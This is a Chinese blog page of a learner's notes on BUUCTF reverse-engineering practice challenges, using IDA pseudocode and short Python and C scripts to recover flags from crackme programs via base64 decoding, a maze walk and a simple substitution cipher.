<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>BUUCTF-做题笔记 | Bosh's Blog</title><meta name="author" content="bosh"><meta name="copyright" content="bosh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="整理一下笔记  BUUCTF-rehelloword用IDA打开，选择  之后alt+t搜索flag 收获：可以通过直接搜索flag来解决问题。 Reverse3首先用IDA打开，然后找到main函数，分析函数通过strncmp函数比较情况，当Destination&#x3D;Str2时，找到flag。str2根据上面的函数判断，但是分析其又用了base64进行加密故得出结果。 解密脚本思路为:">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF-做题笔记">
<meta property="og:url" content="http://example.com/2025/03/08/BUUCTF/index.html">
<meta property="og:site_name" content="Bosh&#39;s Blog">
<meta property="og:description" content="整理一下笔记  BUUCTF-rehelloword用IDA打开，选择  之后alt+t搜索flag 收获：可以通过直接搜索flag来解决问题。 Reverse3首先用IDA打开，然后找到main函数，分析函数通过strncmp函数比较情况，当Destination&#x3D;Str2时，找到flag。str2根据上面的函数判断，但是分析其又用了base64进行加密故得出结果。 解密脚本思路为:">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://z-bosh.github.io/img/match12.jpg">
<meta property="article:published_time" content="2025-03-08T00:00:00.000Z">
<meta property="article:modified_time" content="2025-05-13T13:14:00.427Z">
<meta property="article:author" content="bosh">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://z-bosh.github.io/img/match12.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/03/08/BUUCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        if (name && globalFn[key][name]) return
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BUUCTF-做题笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-13 13:14:00'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://z-bosh.github.io/img/match12.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bosh's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">BUUCTF-做题笔记</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF-做题笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-08T00:00:00.000Z" title="发表于 2025-03-08 00:00:00">2025-03-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-13T13:14:00.427Z" title="更新于 2025-05-13 13:14:00">2025-05-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">41k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>190分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>整理一下笔记</p>
</blockquote>
<h1 id="BUUCTF-re"><a href="#BUUCTF-re" class="headerlink" title="BUUCTF-re"></a>BUUCTF-re</h1><h2 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h2><p>用IDA打开，选择</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443008.png" alt="image-20231106211910116"></p>
<p>之后alt+t搜索flag</p>
<p><strong>收获：</strong>可以通过直接搜索flag来解决问题。</p>
<h2 id="Reverse3"><a href="#Reverse3" class="headerlink" title="Reverse3"></a>Reverse3</h2><p>首先用IDA打开，然后找到main函数，分析函数通过strncmp函数比较情况，当Destination&#x3D;Str2时，找到flag。str2根据上面的函数判断，但是分析其又用了base64进行加密故得出结果。</p>
<p>解密脚本思路为:将Str2逆向还原为Des，再对Des做base64解码</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443162.png" alt="image-20240116120550093"></p>
<p>提示base64加密再根据sub_4110BE函数判断为base64编码。</p>
<p>注意下面的循环 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(Destination, v4, <span class="number">0x28</span>u);</span><br><span class="line">v11 = j_strlen(Destination);  </span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v11; ++j )</span><br><span class="line">    Destination[j] += j;<span class="comment">//循环对其进行了一次转换所以在我们逆向回去时要进行一次变换</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">Des=<span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span><span class="comment">//定义字符串变量</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span><span class="comment">//定义空字符串变量</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i in range(len(Des)):</span><br><span class="line">    flag+=chr(ord(Des[i])-i)<span class="comment">//将转换后的字符追加到 flag 中。</span></span><br><span class="line">print(base64.b64decode(flag))<span class="comment">//通过 base64.b64decode(flag) 对 flag 进行 Base64 解码，得到最终结果</span></span><br><span class="line"> <span class="comment">///我们也可以进行base64进行在线解密 </span></span><br></pre></td></tr></table></figure>

<p><strong>脚本分析：</strong></p>
<p>ord(Des[i]) 将字符 Des[i] 转换为对应的 ASCII 值。  <u>&#x2F;&#x2F;ord() 函数获取一个字符的 ASCII 值。</u></p>
<p>ord(Des[i]) - i 对 ASCII 值进行减法操作，使用索引 i 对每个字符的 ASCII 值进行递减。</p>
<p>chr(…) 将得到的减法结果转换回字符    <u>&#x2F;&#x2F;chr() 函数将一个 ASCII 值转换为对应的字符。</u></p>
<p><strong>收获：</strong></p>
<p>一、了解了stencmp函数，它为字符串比较函数 ，将str1和str2进行比较，最多比较n个字节。</p>
<p>若str1与str2的前n个字符相同，则返回0；</p>
<p>若s1大于s2，则返回大于0的值；</p>
<p>若s1 小于s2，则返回小于0的值。</p>
<p>二、base64加密。它是一种将 byte数组编码为字符串的方法，而且编码出的字符串只包含ASCII基础字符。</p>
<h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p>打开找到main函数，分析函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);<span class="comment">//是一个5*5的迷宫</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);<span class="comment">//根据上下左右来判断是一个</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);<span class="comment">//走迷宫的游戏</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">~~~~~~~</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);<span class="comment">//翻译为你输入的顺序是flag！</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p> 根据分析：</p>
<p>*1111<br>01000              &#x2F;&#x2F;从星号走到井号<br>01010<br>00010<br>1111#</p>
<p>所以输入的顺序为：222441144222</p>
<p><strong>收获</strong>：</p>
<p>对数字敏感些，一些数字可能在提醒你做题的方向</p>
<p>strcpy函数：它是将一个字符串复制到另一块空间地址中的函数</p>
<p><code>strcpy(arrayName1,arrayName2);//arrName1(被覆盖者),arrName2(覆盖者)</code></p>
<h2 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev~"></a>SimpleRev~</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//找到main函数，点开Decry，分析找到</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);<span class="comment">//text为我们所找flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//再点开  text = join(key3, (const char *)v9);</span></span><br><span class="line"><span class="built_in">strcpy</span>(dest, a1);</span><br><span class="line"> <span class="built_in">strcat</span>(dest, a2);<span class="comment">//明白join函数的原理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> text = join(key3, (<span class="type">const</span> <span class="type">char</span> *)v9);<span class="comment">///这里也用了小段储存</span></span><br></pre></td></tr></table></figure>

<p> 所以 text&#x3D;key3+v9;X查看它们的值。</p>
<p>text&#x3D;”killshdow“</p>
<p>在继续向下看查看key的值，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> *(_QWORD *)src = <span class="string">&#x27;SLCDN&#x27;</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(key, key1);<span class="comment">//点击进去key1=ADSFK</span></span><br><span class="line"><span class="built_in">strcat</span>(key, src);<span class="comment">//src=&#x27;SLCDN&#x27;,其中使用了小端存储</span></span><br></pre></td></tr></table></figure>

<p>所以key&#x3D;’ADSFKNDCLS’</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这上面的代码把key把大写改为小写</span></span><br><span class="line"><span class="comment">//我把它放进chatgpt分析一下，也可以自己进行脚本编写进行验证</span></span><br></pre></td></tr></table></figure>

<p>所以现在的key&#x3D;key &#x3D; ‘adsfkndcls’</p>
<p>然后根据下面的代码进行脚本编写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;<span class="comment">//v2的初始值为0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;=<span class="string">&#x27;a&#x27;</span>|| v1 &gt; <span class="string">&#x27;z&#x27;</span> )<span class="comment">//96=a，122=z</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; v1 &lt;= <span class="string">&#x27;Z&#x27;</span> )<span class="comment">//64=@，90=Z</span></span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;<span class="comment">//由上面可知v5=10，v3的初始值为0现在应该为10</span></span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">		<span class="keyword">if</span> text[i] == <span class="built_in">chr</span>((x-<span class="number">39</span>-<span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> +<span class="number">97</span>):</span><br><span class="line">			flag= flag+<span class="built_in">chr</span>(x)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p>通过ord()函数获取密钥key的ASCII值，再将其减去39。这一步是为了使得结果在0-25之间，以便后续对小写字母进行循环移位加密。</p>
</li>
<li><p>将(x-39-ord(key[i]) + 97) % 26 +97的结果转换为字符，并与text[i]进行比较。</p>
</li>
<li><p>如果相等，则将字符x添加到flag中，并使用break语句跳出内部循环。</p>
<p>所以flag{KLDQCUDFZO}</p>
</li>
</ol>
<p>python语言写的太简短了，自己又用C语言编写了一遍</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">   <span class="type">char</span>	key[] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line">   <span class="type">char</span> text[]=<span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">	<span class="type">int</span> v5=<span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> v3=<span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> v2=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> flag[<span class="number">100</span>]=<span class="string">&quot;&quot;</span>;<span class="comment">//注意定义数组长度，考虑其越界问题。</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)   </span><br><span class="line">    &#123;                                             <span class="comment">//text遍历 求flag </span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">128</span>;j++)&#123;<span class="comment">//j代替v1遍历求值</span></span><br><span class="line">			<span class="keyword">if</span>(j&lt;<span class="string">&#x27;A&#x27;</span>||j&gt;<span class="string">&#x27;z&#x27;</span>||j&gt;<span class="string">&#x27;Z&#x27;</span>&amp;&amp;j&lt;<span class="string">&#x27;a&#x27;</span>)         <span class="comment">//非英文字母跳过</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">if</span>(text[i]==(j<span class="number">-39</span>-key[v3%v5]+<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span>) </span><br><span class="line">            &#123;</span><br><span class="line">				flag[i]=j; </span><br><span class="line">				v3++;</span><br><span class="line">				<span class="keyword">break</span>;                      </span><br><span class="line">				 </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p><strong>收获：</strong></p>
<p>strlen函数：是用以计算字符串长度的函数</p>
<p>strcat函数：它又被称为是字符串追加&#x2F;连接函数，它的功能就是在一个字符串后面追加上另外一个字符串。</p>
<p>小端储存：简单就是说把字符 串倒过来读，如果是16位进制则两位一输出：12 34 56    ~56 34 12 </p>
<p>range()函数用法的一般形式为：range(起始值, 终止值, 步长)</p>
<p>例如，range(5)表示生成一个0到4的整数序列，range(1,5)表示生成一个1到4的整数序列，range(1,10,2)表示生成一个1、3、5、7和9的整数序列。</p>
<h2 id="ACTF新生赛2020-easyre1"><a href="#ACTF新生赛2020-easyre1" class="headerlink" title="[ACTF新生赛2020]easyre1"></a>[ACTF新生赛2020]easyre1</h2><p>首先，先查看是否有壳，脱壳之后，找到main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line"><span class="comment">//将字符串复制给V4=“F&#x27;\&quot;N,\&quot;(I?+@”</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line"><span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="string">&#x27;A&#x27;</span> || v6[<span class="number">1</span>] != <span class="string">&#x27;C&#x27;</span> || v6[<span class="number">2</span>] != <span class="string">&#x27;T&#x27;</span> || v6[<span class="number">3</span>] != <span class="string">&#x27;F&#x27;</span> || v6[<span class="number">4</span>] != <span class="string">&#x27;&#123;&#x27;</span> || v10 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//推断V6的字符为ACTF&#123;#####&#125;，#号为未知量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )&#123;</span><br><span class="line"> <span class="keyword">if</span> ( v4[i] != _data_start__[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line"><span class="comment">//推断出当V4和 _data_start__[v5[i] - 1]相等时为正确的flag</span></span><br><span class="line">_data_start__[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] 等价于 _data_start__[v5[i] - <span class="number">1</span>]。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><strong>脚本分析</strong></p>
